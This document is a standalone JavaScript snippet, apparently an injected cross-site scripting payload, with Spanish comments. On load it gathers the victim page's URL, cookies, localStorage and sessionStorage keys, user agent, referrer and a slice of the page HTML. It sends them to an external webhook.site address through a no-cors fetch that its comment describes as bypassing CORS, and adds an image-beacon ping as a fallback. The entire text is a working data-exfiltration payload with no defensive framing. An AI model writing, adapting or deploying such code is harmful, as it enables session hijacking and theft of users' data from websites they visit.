(function() {
  'use strict';
  
  var WEBHOOK = 'https://webhook.site/1017fe30-0b47-473e-98b3-3badba9b4f69/recon';

  function safe(fn, fallback) {
    try { return fn(); } catch(e) { return fallback || ('err:' + e.message); }
  }

  var ctx = {
    href:     safe(function() { return location.href; }),
    origin:   safe(function() { return location.origin; }),
    title:    safe(function() { return document.title; }),
    cookies:  safe(function() { return document.cookie; }, 'empty'),
    ls_keys:  safe(function() { return Object.keys(localStorage).join(','); }, 'blocked'),
    ss_keys:  safe(function() { return Object.keys(sessionStorage).join(','); }, 'blocked'),
    ua:       safe(function() { return navigator.userAgent; }),
    referrer: safe(function() { return document.referrer; }),
    html:     safe(function() { return document.documentElement.outerHTML.substring(0, 2000); }),
    ts:       new Date().toISOString()
  };

  // POST con mode no-cors — no necesita preflight, bypasea CORS
  fetch(WEBHOOK, {
    method: 'POST',
    mode: 'no-cors',
    headers: { 'Content-Type': 'text/plain' },
    body: JSON.stringify(ctx)
  });

  // Ping de confirmación mínimo por si fetch falla
  new Image().src = WEBHOOK + '/ping?o=' + encodeURIComponent(ctx.origin) + '&t=' + Date.now();

})();
